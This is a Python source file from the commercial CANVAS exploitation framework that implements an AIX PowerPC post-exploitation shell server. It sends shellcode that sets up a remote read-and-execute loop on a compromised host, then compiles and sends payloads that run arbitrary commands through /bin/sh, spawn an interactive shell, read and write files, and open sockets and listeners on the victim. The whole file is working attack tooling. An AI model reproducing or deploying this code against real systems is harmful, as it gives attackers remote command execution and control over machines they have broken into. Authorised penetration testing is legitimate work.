#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import copy
from exploitutils import *

from shellserver import unixshellserver
from remoteresolver import aixremoteresolver
from MOSDEFShellServer import MSSgeneric
from MOSDEF import GetMOSDEFlibc

import shellcodeGenerator

class AIX_PowerPC(MSSgeneric, unixshellserver, aixremoteresolver):
    def __init__(self, connection, node, version = None, logfunction = None, initialisedFD = None):
        aixremoteresolver.__init__(self, version = version)
        unixshellserver.__init__(self, connection, type="Active", logfunction = logfunction)
        MSSgeneric.__init__(self, 'PowerPC')

        # libc is already inited in the remote resolver init ...
        self.libraryDict            = {}
        self.functionDict           = {}
        self.remotefunctioncache    = {}
        self.node                   = node
        self.node.shell             = self
        self.started                = 0
        self.version                = version
        self.order                  = big_order
        # default to the safest assumption (stack is hosed)
        self.errno                  = False
    
    def startup(self):

        if self.started:
            return 0

        self.connection.set_timeout(None)
        
        sc = shellcodeGenerator.aix_powerpc(version = self.version)
        if isdebug('aixshellserver::startup::shellcode_attach'):
            print "attach and press <enter>"
            sys.stdin.read(1)
        if hasattr(self, 'initialisedFD') and self.initialisedFD != None:
            self.fd = self.initialisedFD
        else:
            sc.addAttr("flushcache", {})
            sc.addAttr("sendreg", {"fdreg": "r30", "regtosend": "r30"})
            if self.errno == True:
                sc.addAttr("read_and_exec_loop", {"fd": "r30"})
            else:
                # this is what you wanna have available on mangled stack overflows
                sc.addAttr("read_and_exec_loop_no_errno", {"fd": "r30"})
            getfd = sc.get()
            #print shellcode_dump(getfd, mode="Risc")
            self.sendrequest(getfd)
            self.fd = self.readword()
            self.leave()

        self.log("Self.fd=%d" % self.fd)
        self.libc.initStaticFunctions({'fd': self.fd})
        self.localfunctions = copy.deepcopy(self.libc.localfunctions)
        self.initLocalFunctions()
      
        # this inits self.libc again! so set the right version :>
        sc = shellcodeGenerator.aix_powerpc(version = self.version)

        # deal with mangled stacks that dont have the errno pointer anymore ...
        if self.errno == True:
            sc.addAttr("read_and_exec_loop", {"fd": "r30"})
        else:
            sc.addAttr("read_and_exec_loop_no_errno", {"fd": "r30"})
            
        mainloop = sc.get()
        #print sc.getcode()
        self.log("mainloop length=%d" % len(mainloop))
        self.sendrequest(mainloop)
        self.leave()
                
        self.log("Resetting signal handlers...")
        SIGCHLD = self.libc.getdefine('SIGCHLD')
        SIG_DFL = self.libc.getdefine('SIG_DFL')
        SIGPIPE = self.libc.getdefine('SIGPIPE')
        SIG_IGN = self.libc.getdefine('SIG_IGN')
        self.log("Defaulting SIGCHLD")
        self.signal(SIGCHLD, SIG_DFL)
        self.log("Ignoring SIGPIPE")
        self.signal(SIGPIPE, SIG_IGN)
        
        self.log("Getting UIDs");
        self.setInfo("AIX MOSDEF ShellServer. Remote host: %s" % ("*" + str(self.getRemoteHost()) + "*"))
        self.setProgress(100)
        self.started = 1
        return self.started
    
    def runcommand(self, command):
        data = ""
        data = self.popen2(command)
        return data
    
    def getids(self):
        uid, euid, gid, egid = self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d" % (uid, euid, gid, egid)
    
    def pwd(self):
        ret = self.getcwd()
        return ret

    def getcwd(self):
        # emulate overcomplicated fstat walk :P
        return self.popen2('pwd').strip()
    
    def cd(self, dest):
        if sint32(self.chdir(dest)) == -1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s"%(dest)
    
    def popen2(self, command):
        
        vars                = {}
        vars["command"]     = command
        vars["shell"]       = "/bin/sh"
        vars["dashc"]       = "-c"
        vars["mosdeffd"]    = self.fd
        
        code = """
        #import "local", "pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "memset" as "memset"
        #import "local", "sendstring" as "sendstring"
        #import "local", "wait" as "wait"
        
        #import "string", "command" as "command"
        #import "string", "dashc" as "dashc"
        #import "string", "shell" as "shell"
        #import "int", "mosdeffd" as "mosdeffd"
        
        void main()
        {
            int pipes[2];
            char buf[1001];
            int bpipes[2];
            char *argv[4];
            char **envp;
            int ret;
            int pid;
            int i;
            
            envp = 0;
            argv[0] = shell;
            argv[1] = dashc;
            argv[2] = command;
            argv[3] = 0;
            
            argv[3] = 0;
            pipe(pipes);
            pipe(bpipes);
            
            // now we fork and exec and read from the socket until we are done
            pid = fork();
            if (pid == 0)
            {
                close(0);
                close(1);
                close(2);
                dup2(pipes[0], 0);
                dup2(bpipes[1], 1);
                dup2(bpipes[1], 2);
                close(bpipes[0]);
                execve(shell, argv, envp);
                exit(1);
            }
            
            // father
            close(bpipes[1]);
            close(pipes[0]);
            
            memset(buf, 0, 1001);
            while (read(bpipes[0], buf, 1000) != 0) 
            {
                sendstring(buf);
                memset(buf, 0, 1001);
            }

            sendstring(buf);
            close(pipes[1]);
            close(bpipes[0]);
            wait(0);
            wait(0);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        tmp = self.readstring()
        data = [tmp]
        while tmp != "":
            tmp = self.readstring()
            data += [tmp]
        data = "".join(data)
        self.leave()
        return data
    
    def shellshock(self, logfile=None):
        """implements an interactive shell, reverts back to MOSDEF on \'exit\'"""
        
        vars                    = self.libc.getdefines()
        vars["shell"]           = "/bin/sh"
        vars["dashi"]           = "-i"
        vars["mosdefd"]         = self.fd
        vars["POLLERRORMASK"]   = vars["POLLERR"] | vars["POLLHUP"] | vars["POLLNVAL"]
       
        code = """
        #include <sys/poll.h>
        
        #import "local", "pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "write" as "write"
        #import "local", "sendstring" as "sendstring"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"
        #import "local", "exit" as "exit"
        #import "local", "getpid" as "getpid"
        #import "int", "POLLRDNORM" as "POLLRDNORM"
        #import "int", "POLLERRORMASK" as "POLLERRORMASK"
        
        #import "string", "shell" as "shell"
        #import "string", "dashi" as "dashi"
        #import "int", "mosdefd" as "mosdefd"
        
        void main()
        {
            char *exec[3];
            char in[512];
            char out[512];
            int pid;
            int rfd;
            int wfd;
            int len;
            int ret;
            int error;
            int ufds[4];
            int moscheck;
            int shellcheck;
            int write_pipe[2];
            int read_pipe[2];
            int ppid;

            exec[0] = shell;
            exec[1] = dashi;
            exec[2] = 0;
            
            pipe(write_pipe);
            pipe(read_pipe);
            
            pid = fork();

            if (pid == 0)
            {
                close(0);
                close(1);
                close(2);
                dup2(write_pipe[0], 0);
                dup2(read_pipe[1], 1);
                dup2(read_pipe[1], 2);
                close(read_pipe[0]);
                execve(exec[0], exec, 0);
                exit(1);
            }
            
            close(read_pipe[1]);
            close(write_pipe[0]);
            
            rfd = read_pipe[0];
            wfd = write_pipe[1];

            error = 0;
            while (error == 0)
            {
                ufds[0] = rfd;
                ufds[1] = POLLRDNORM << 16;

                ufds[2] = mosdefd;
                ufds[3] = POLLRDNORM << 16;
                
                ret = poll(&ufds, 2, -1);
                if (ret > 0)
                {
                    shellcheck = ufds[1] & POLLRDNORM;
                    if (shellcheck == POLLRDNORM)
                    {
                        memset(&in, 0, 512);
                        len = read(rfd, in, 511);
                        if (len > 0)
                        {
                            sendstring(in);
                        }
                        else
                        {
                            sendint(0);
                            error = 1;
                        }
                    }
                    shellcheck = ufds[1] & POLLERRORMASK; // POLLERR | POLLHUP | POLLNVAL
                    if (shellcheck != 0)
                    {
                        sendint(0);
                        error = 1;
                    }
                    moscheck = ufds[3] & POLLRDNORM;
                    if (moscheck == POLLRDNORM)
                    {
                        memset(&out, 0, 512);
                        len = read(mosdefd, out, 511);
                        if (len > 0)
                        {
                            write(wfd, out, len);
                        }
                        else
                        {
                            sendint(0);
                            error = 1;
                        }
                    }
                    moscheck = ufds[3] & POLLERRORMASK; // POLLERR | POLLHUP | POLLNVAL
                    if (moscheck != 0)
                    {
                        sendint(0);
                        error = 1;
                    }
                }
            }
            return;
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.shellshock_loop(endian='big', logfile=logfile)
        self.leave()
        return ret

    def mkdir(self, path, mode=0777):
        vars = { 'path' : path, 'mode' : mode }
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "mkdir" as "mkdir"
        
        #import "string", "path" as "path"
        #import "int", "mode" as "mode"
        
        int main()
        {
          int ret;
          ret = mkdir(path, mode);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret   

    def fstat(self, fd):
        """ runs fstatx """
        
        vars = {}
        vars['fd'] = fd
        
        code = """
        #include "fstat.h"

        #import "local", "sendint" as "sendint"
        #import "local", "sendshort" as "sendshort"
        #import "local", "fstat" as "fstat"
        
        #import "int", "fd" as "fd"

        void main()
        {
            struct stat buf;
            int ret;

            ret = fstat(fd, &buf);
            sendint(ret);

            if (ret == 0)
            {
                sendint(buf.st_dev);
                sendint(buf.st_ino);
                sendint(buf.st_mode);
                sendshort(buf.st_nlink);
                sendshort(buf.st_flag);
                sendint(buf.st_uid);
                sendint(buf.st_gid);
                sendint(buf.st_rdev);
                sendint(buf.st_size);
                sendint(buf.st_atime);
                sendint(buf.st_mtime);
                sendint(buf.st_ctime);
                sendint(buf.st_blksize);
                sendint(buf.st_blocks);
                sendint(buf.st_vfstype);
                sendint(buf.st_vfs);
                sendint(buf.st_type);
                sendint(buf.st_gen);
            }

            return;
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint()
        statbuf = None
        if not ret:
            statbuf = self.readstruct([ ('l', 'st_dev'),
                                        ('l', 'st_ino'),
                                        ('l', 'st_mode'),
                                        ('s', 'st_nlink'),
                                        ('s', 'st_flag'),
                                        ('l', 'st_uid'),
                                        ('l', 'st_gid'),
                                        ('l', 'st_rdev'),
                                        ('l', 'st_size'),
                                        ('l', 'st_atime'),
                                        ('l', 'st_mtime'),
                                        ('l', 'st_ctime'),
                                        ('l', 'st_blksize'),
                                        ('l', 'st_blocks'),
                                        ('l', 'st_vfstype'),
                                        ('l', 'st_vfs'),
                                        ('l', 'st_type'),
                                        ('l', 'st_gen') ])
        self.leave()
        return ret,statbuf

    def readfromfd(self, fd, size):
        """ reads from an open fd """

        vars = {}

        vars['size'] = size
        vars['sock'] = self.fd
        vars['file'] = fd

        code = """
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"

        #import "int", "size" as "size"
        #import "int", "sock" as "sock"
        #import "int", "file" as "file"

        void main()
        {
            char buf[1001];
            int left;

            left = size;

            while(left > 1000)
            {
                read(file, buf, 1000);
                writeblock(sock, buf, 1000);
                left = left - 1000;
            }

            if (left > 0)
            {
                read(file, buf, left);
                writeblock(sock, buf, left);
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        data = self.readbuf(size)
        self.leave()
        return data

    def writetofd(self, fd, data):
        """ writes data to an fd """

        vars = {}

        vars['size'] = len(data)
        vars['sock'] = self.fd
        vars['file'] = fd

        code = """
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"

        #import "int", "size" as "size"
        #import "int", "sock" as "sock"
        #import "int", "file" as "file"

        void main()
        {
            char buf[1001];
            int left;

            left = size;

            while(left > 1000)
            {
                readblock(sock, buf, 1000);
                write(file, buf, 1000);
                left = left - 1000;
            }

            if (left > 0)
            {
                readblock(sock, buf, left);
                write(file, buf, left);
            }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()
        return
    
    def write(self,fd,buffer):
        code = """
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "write" as "write"
        #import "local", "sendint" as "sendint"

        void 
        main() 
        {
            int i;
            char *p;
            int wanted;
            int success;

            wanted  = length;
            p       = buffer;
            success = 1;

            while (wanted > 0 ) 
            {
                i = write(fd, p, wanted); 
                if (i < 0) 
                {
                    wanted  = 0;
                    success = 0;
                }
                else
                {
                    wanted  = wanted-i;
                    p       = p+i;
                }
            }
          
            sendint(success);
        }
        """
        vars            = {}
        vars["fd"]      = fd
        vars["length"]  = len(buffer)
        vars["buffer"]  = buffer
        
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()
        return ret

    def socket(self,proto):
        code = """
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "proto" as "proto"
        #include "socket.h"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            i = socket(AF_INET,proto,0);
            sendint(i);
        }
        """

        if proto.lower() == "tcp":
            proto = self.libc.getdefine('SOCK_STREAM')
        elif proto.lower() == "udp":
            proto = self.libc.getdefine('SOCK_DGRAM')
        else:
            return -1

        vars            = self.libc.getdefines()
        vars["proto"]   = proto

        self.clearfunctioncache()
        message = self.compile(code, vars)
        self.sendrequest(message)
        ret = self.readint()
        self.leave()
        return ret

    def connect(self, fd, host, port, proto, timeout):

        if proto.lower() == "tcp":
            proto = self.libc.getdefine('SOCK_STREAM')
        elif proto.lower() == "udp":
            proto = self.libc.getdefine('SOCK_DGRAM')
        else:
            return -1

        return self.connect_sock(fd, host, port, proto, timeout)

    def connect_sock(self, fd, host, port, proto, timeout):

        vars            = self.libc.getdefines()
        vars['ip']      = struct.unpack('>L', (socket.inet_aton(socket.gethostbyname(host))))[0]
        vars['port']    = port
        vars['proto']   = proto
        vars['sockfd']  = fd
        vars['timeout'] = timeout * 1000 # miliseconds

        code = """
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_ERROR" as "SO_ERROR"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"

        #include "socket.h"

        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "poll" as "poll"
        #import "local", "memset" as "memset"
        #import "local", "fcntl" as "fcntl"
        #import "local", "getsockopt" as "getsockopt"

        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"

        #import "local", "debug" as "debug"

        struct pollfd {
            int fd;
            short events;
            short revents;
        };

        void main()
        {
            int i;
            int ret;
            int ilen;
            int sockopt;
            int opts;

            struct sockaddr_in serv_addr;
            struct pollfd ufd;

            serv_addr.family    = AF_INET;
            serv_addr.port      = port;
            serv_addr.addr      = ip;

            opts = fcntl(sockfd, F_GETFL, 0);
            opts = opts | O_NONBLOCK;
            fcntl(sockfd, F_SETFL, opts);

            ret = connect(sockfd, &serv_addr, 16);

            //debug();

            if (ret < 0) 
            {
                // EINPROGRESS .. errno reversed in ret on error
                if (ret == -55) 
                {
                    ufd.fd      = sockfd;
                    ufd.events  = 0x0002; // POLLOUT
                    ufd.revents = 0x0000;

                    i = poll(&ufd, 1, timeout);
                    if (i > 0) 
                    {
                        sockopt = 0;
                        ilen    = 4;
                        getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);
                        if (sockopt) 
                        {
                            sendint(-1); // sockopt == errno
                            return;
                        }
                    }
                    else 
                    {
                        sendint(-2);
                        return;
                    }
                }
                else {
                   sendint(-1);
                   return;
                }
            }

            // set back to blocking
            opts    = fcntl(sockfd, F_GETFL, 0);
            opts    = opts & O_BLOCK;
            fcntl(sockfd, F_SETFL, opts);

            sendint(0);
        }
        """
        
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()

        return ret

    def getListenSock(self, addr, port):
        
        code = """
        #import "local", "bind" as "bind"
        #import "local", "listen" as "listen"
        #import "local", "socket" as "socket"
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        
        #import "int", "addr" as "addr"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        
        #include "socket.h"

        void main()
        {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;

            serv_addr.family    = AF_INET;
            sockfd              = socket(AF_INET,SOCK_STREAM,0);
            serv_addr.port      = port;
            serv_addr.addr      = addr;

            i = bind(sockfd, &serv_addr, 16);

            if (i < 0)
            {
                close(sockfd);
                sendint(-1);
            }
            else 
            {
                i = listen(sockfd, 16);
                if (i < 0)
                {
                    close(sockfd);
                    sendint(-2);
                }
                else
                {
                    sendint(sockfd);
                }
            }
        }
        """
        vars            = self.libc.getdefines()
        vars['port']    = port
        vars['addr']    = struct.unpack("!L", socket.inet_aton(addr))[0]

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        fd = self.readint()
        self.leave()

        return fd

    def setblocking(self, fd, blocking):

        code = """
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "int", "sock" as "sock"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"

        void main() 
        {
            int opts;

            opts = fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
        """

        if blocking:
            code += "opts = opts & O_BLOCK;\n"
        else:
            code += "opts = opts | O_NONBLOCK;\n"

        code += """
            fcntl(sock,F_SETFL,opts);
        }
        """

        vars            = self.libc.getdefines()
        vars['sock']    = fd

        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def isactive(self, fd, timeout=0):

        if timeout == None:
            timeout = 0

        code = """
        #import "local", "poll" as "poll"
        #import "local", "sendint" as "sendint"
        #import "int", "timeout" as "timeout"
        #import "int", "fd" as "fd"

        struct pollfd {
            int fd;
            short events;
            short revents;
        };

        void main()
        {
            struct pollfd ufd;
            ufd.fd = fd;
            int i;
            int r;

            ufd.events  = 0x0001;
            ufd.revents = 0x0000;
            i = poll(&ufd, 1, timeout);
            r = ufd.revents & 0x0001;

            if (r > 0)
            {
                sendint(1);
            }
            else
            {
                sendint(0);
            }
        }
        """

        vars            = {}
        vars['fd']      = fd
        vars['timeout'] = timeout

        self.clearfunctioncache()
        message = self.compile(code, vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        self.leave()

        return ret

    def setsockopt(self, fd, option, arg):

        code = """
        #import "local", "setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sock" as "sock"

        void main() 
        {
            int i;
            
            i = arg;
            // AIX takes a pointer to the arg and a len of the arg ..
            setsockopt(sock, level, option, &i, 4);
        }
        """

        vars            = self.libc.getdefines()
        vars['option']  = option
        vars['arg']     = arg
        vars['sock']    = fd
        vars['level']   = vars['SOL_SOCKET']

        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def getrecvcode(self,fd,length):

        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))

        code="""
        #import "local", "recv" as "recv"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"

        void main()
        {
            int i;
            char buf[1000];
            int wanted;

            wanted = length;
            while (wanted > 0 ) 
            {
                if (wanted < 1000)
                {
                    i = recv(fd, buf, wanted, 0);
                }
                else
                {
                    i = recv(fd, buf, 1000, 0);
                }
                if (i < 0)
                {
                    writeblock2self(buf, 0);
                    wanted = 0;
                }
                else
                {
                    writeblock2self(buf, i);
                    wanted = wanted - i;
                }
            }
        }
        """

        vars            = {}
        vars['fd']      = fd
        vars['length']  = int(length)

        self.clearfunctioncache()
        message = self.compile(code, vars)

        return message

    def recv(self,fd, length):

        message = self.getrecvcode(fd,length)
        self.sendrequest(message)

        gotlength   = 0
        ret         = []
        buffer      = self.node.parentnode.recv(self.connection, length)

        self.leave()

        return buffer

    def recv_lazy(self, fd, timeout=None, length=1000):

        if timeout == None:
            timeout = 0
 
        if length > 1000:
            length = 1000

        code = """
        #import "local", "recv" as "recv"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        #import "local", "poll" as "poll"
        #import "local", "debug" as "debug"

        struct pollfd {
            int fd;
            short events;
            short revents;
        };

        void main()
        {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;

            ufds.fd = fd;
            ufds.events = 0x0001;
            ufds.revents = 0x0000;

            i = poll(&ufds, 1, timeout);
            r = ufds.revents & 0x0001;

            sendint(i);

            if (r > 0)
            {
                i = recv(fd, buf, length, 0);
                sendint(i);
                if (i > 0)
                {
                    //debug();
                    sendblock2self(buf, i);
                }
            }
        }
        """

        vars            = {}
        vars['fd']      = fd
        vars['timeout'] = timeout
        vars['length']  = length

        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)

        poll_result = self.readint(signed=True)
        recv_result = 1

        if poll_result > 0:
            recv_result = sint32(self.readint())
            if recv_result > 0:
                buffer = self.readblock()
        else:
            buffer = ''

        if recv_result <= 0:
            raise socket.error

        self.leave()

        return buffer

    def accept(self, fd):

        code = """
        #import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #include "socket.h"

        void main()
        {
            int i;
            struct sockaddr_in sa;
            int len;

            len = 16;
            i = accept(fd, &sa, &len);
            sendint(i);
            sendint(sa.addr);
        }
        """

        vars        = {}
        vars['fd']  = fd

        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)

        ret     = sint32(self.readint())
        addr    = self.readint()

        self.leave()

        return ret

    def getsendcode(self,fd,buffer):
        devlog('shellserver::getsendcode', "Sending %d bytes to fd %d" % (len(buffer), fd))
        
        code = """
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "send" as "send"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            char *p;
            int wanted;
            int success;

            wanted  = length;
            p       = buffer;
            success = 1;

            while (wanted > 0)
            {
                i = send(fd, p, wanted, 0); // flags set to zero here
                if (i < 0)
                {
                    wanted = 0;
                    success = 0;
                }
                else
                {
                    wanted = wanted - i;
                    p = p + i;
                }
            }
            sendint(success);
        }
        """
        self.special_shellserver_send = True

        vars            = {}
        vars['fd']      = fd
        vars['length'] = len(buffer)
        vars['buffer'] = buffer

        self.clearfunctioncache()
        message = self.compile(code,vars)

        return message

    def send(self, fd, buffer):
        message = self.getsendcode(fd, buffer)
        self.sendrequest(message)
        
        ret = self.readint() # get send status code
        self.leave()

        if not ret:
            raise Exception, '[!] send failed ... handle me! (re-raise to socket.error in MOSDEFSock)'
        
        return len(buffer)

